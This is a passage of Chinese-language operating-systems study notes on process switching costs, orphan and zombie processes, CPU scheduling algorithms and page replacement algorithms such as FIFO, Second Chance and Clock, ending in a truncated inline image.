切换进程后，页表也要进行切换，TLB就失效了（页表缓冲），cache失效导致命中率降低，虚拟地址转换为物理地址就会很慢。</p><h2><span id="孤儿进程和僵尸进程">孤儿进程和僵尸进程 √</span></h2><p>一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</p><p>即子进程先于父进程退出后，子进程的PCB需要其父进程释放（调用wait或者waitpid），但是父进程并没有释放子进程的PCB，这样的子进程就称为僵尸进程，僵尸进程实际上是一个已经死掉的进程。</p><h2><span id="进程调度方法详细介绍">进程调度方法详细介绍 √</span></h2><p>1）程序任务有三种:CPU计算密集型、IO密集型与平衡型。2）调度算法：（1） 先来先去服务算法：其优点就是简单且实现容易，缺点则是短的工作有可能变得很慢，因为其前面有很长的工作在执行，这样就会造成用户的交互式体验也比较差。<br>（2）时间片轮转算法：　时间片轮转是对FCFS算法的一种改进，其主要目的是改善短程序的响应时间，实现方式就是周期性地进行进程切换。时间片轮转的重点在<strong>于时间片的选择</strong>，需要考虑多方因素：如果运行的进程多时，时间片就需要短一些；进程数量少时，时间片就可以适当长一些。<br>（3）短任务优先：短任务的优先级比长任务的高，而我们总是安排优先级高的任务先运行。①抢占式：抢占式则是<strong>每增加一个新的进程就需要对所有进程（包括正在CPU上运行的进程）进行检查</strong>，谁的时间短就运行谁。②非抢占式：非抢占式当已经在CPU上运行的任务结束或阻塞时，从候选任务中选择执行时间最短的进程来执行优点：系统平均响应时间在以上几种算法中是最优的缺点：一是可能造成长任务无法得到CPU时间从而导致“肌饿”。二是如何知道每个进程还需要运转多久？<br>（4）优先级调度算法：优先级调度算法给每个进程赋予一个优先级，每次需要进程切换时，找一个优先级最高的进程进行调度。优点在于可以赋予重要的进程以高优先级以确保重要任务能够得到CPU时间，其缺点则有二：一是低优先级的进程可能会“饥饿”，二是响应时间无法保证。<br>（5）混合调度算法：将所有进程分为不同的大类，每个大类为一个优先级。如果两个进程处于不同的大类，则处于高优先级大类的进程优先执行；如果处于同一个大类，则采用时间片轮转算法来执行。</p><h2><span id="页面置换方法详细介绍">页面置换方法详细介绍 √</span></h2><p>页帧：分页式内存管理将物理内存分为等大的小块。</p><p>页：逻辑内存（使用虚拟内存技术扩大的内存，可认为其位于硬盘上），也被分为了等大的小块，称为页。（且页和页帧的大小一定是一样的，它是<strong>写入真实内存</strong>和<strong>写回硬盘最小单位</strong>。）页面置换算法：页帧被写满，但需要用新的页。需要进行置换。</p><p><strong>2.1 Optimal算法（最优算法）</strong>　　首先介绍最优算法，它需要知道以后要被用到的页，然后将不会被用到的页换出内存；如果所有页都会被用到，就把需要使用时间离现在最长的页换出，以尽量使不好的情况晚发生。（不可能实现）</p><p><strong>2.2 FIFO（First-In First-Out，先进先出）算法</strong>　　FIFO算法的思想很简单，就是置换出当前已经待在内存里时间最长的那个页。FIFO算法的运行速度很快，不需要考虑其他的因素，需要的开销很少。</p><p><strong>2.3 Second Chance（第二次机会）算法</strong>　　为了避免FIFO算法将重要的页换出内存，Second Chance算法提供了一些改进。Second Chance算法在将页面换出内存前检查其使用位（使用位前文有介绍），如果其使用位为1，证明此页最近有被使用，猜测它还可能被使用，于是不把它置换出内存，但是把其使用位置为0，随后检查下一个页面，直到发现某页的使用位为0，将此页置换出内存。</p><p><strong>2.4 Clock算法（时钟轮转法）</strong>　　<strong>为了节约Second Chance算法一个接着一个检查使用位的开销</strong>，时钟轮转法又提出了改进。时钟轮转法将所有的页组成一个圆，圆心的指针指向下一个要被置换的页面，置换前同样检查使用位，如果使用位为1，同样将其使用位置为0，随后将顺指针旋转，检查下一个页面，直到发现某页的使用位为0，将此页置换出内存。很容易理解此算法为什么叫“时钟”轮转法。<img src="Tencent/Image.png" alt="img">)<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAkYAAAG5CAYAAABr8fs9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAMpESURBVHhe7d139H5VlR/+JP8ka2UyTpJxYolJdCyJZcQuIIgI0uwCCtL5Ik2qVJEuICBSRHoRBAREEOmCKDKMomJBEQdFUZGZscQymcmMmeT+fq8zn42Xy1Pu0z6fp+z3Wmd9ynOfW849Z+/32e38iyqRSCQSiUQiUZDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSicSy4v/9v/9X2rgxqfMmEonFQhKjRCKxrEhilEgkphlJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJxFQjg6oTicRyIolRIpGYaiQxSiQSy4kkRolEYqbQligloUokEsMgiVEikZgpJDFKJBKTRBKjRCIxU0jCk0gkJokkRolEYsXxf//v/63+8R//sTS/90ISo0QiMUkkMUokEisKJAch+uUvf1n9z//5P8vviUQisVJIYpRIJIYG687vfve76n//7/9d/e3f/m3161//uhCcn//859Vf//VfV4888kj18MMPVz/+8Y+rH/7wh9UPfvCD6sEHH3xM+/73v1994xvfqG6++ebqpptuqr72ta9VDzzwQPl/81jNOR566KFyTuf+q7/6q+pv/uZvyjURK/fwv/7X/6r+4R/+ofqnf/qntC4lEomBkMQokUgMDaToN7/5TSEnyMw3v/nN6stf/nL1hS98obr11lur66+/vrr66qurj3/849VHP/rR6rzzzqvOOeec6uyzz35MO/roo6t3vOMd1WabbVYdcsgh1amnnlqdccYZ5TPHx3f8PP/886uLL764uvzyy6trrrmmuvHGG6vPfvaz1Z//+Z9XX/nKV6p77723EChE6e/+7u8KOUokEom2SGKUSCwwWFP+z//5P8Xig+AgE6w8LDLf+973qvvvv7/61re+VQiP9vWvf7366le/Wn3pS18qRAQhQX4+8YlPFOJz1llnVaeffnp18sknVyeeeGJ13HHHFdJz+OGHF8Jz8MEHVwcddFB14IEHPqZttdVW1XOe85zqT//0T6s3v/nN1e6771695z3vKZ85Pr7jp3O8733vq4444ojq/e9/f/WBD3yg+uAHP1idcsop1Uc+8pFCoBAnhIwV6nOf+1x11113lXt276xT3/72t6vvfve7xSrF8oTYsXSxeqWlKZFYbCQxSiSmDBTycillpIjbCTH4zne+U8jOddddV33sYx+rPvzhD1fHHntsITQHHHBAaXvvvXe10047VVtssUX1hje8oXrd615Xvfa1r63WXXfd8tPfr3/966u3vvWtxQK07bbbluMRnX322afaf//9y3nqpEhDjJ797GdXT3/606s3vvGN1a677lrtu+++jzvOdxGmvfbaq9ptt92qVatWVVtvvXW1+eabF0K18cYbV+uvv365H2299darNtxww/LZO9/5zmrnnXcu3z/ssMOq448/vjrzzDOLNYsL7+677y5WL+QQUUxLUyKxmEhilEhMGcZBjHw/Mr1++9vfFmUvHoeF5L777iuWH0Tg85//fHFFsfhccMEFxYUVZAgxQVB23HHHarvttisNgeHuQl6QIMRjgw02KITkTW96UyEo22yzTfWud72rkBcWHpYdJCTcY6xK4UKLhvCsttpq1XOf+9xCdliaELPmcYgMi9SHPvShcgxLFLL17ne/u3wP+dl0003L/W200UblHhEl5Kh+f0HW9ttvv0dJEmvTRRddVCxNt9xyS3EHcguyMLGciZFiTWNZQia5EZeLwCYSieVDEqNEYg4RpIgS/8u//MtiCfrkJz9ZiMVRRx1V7bnnnoXksPqExQe5edvb3lasPEgDsnLkkUdWJ5xwQnGNaUiJGJ/LLrusEAiWlttvv7268847yzW++MUv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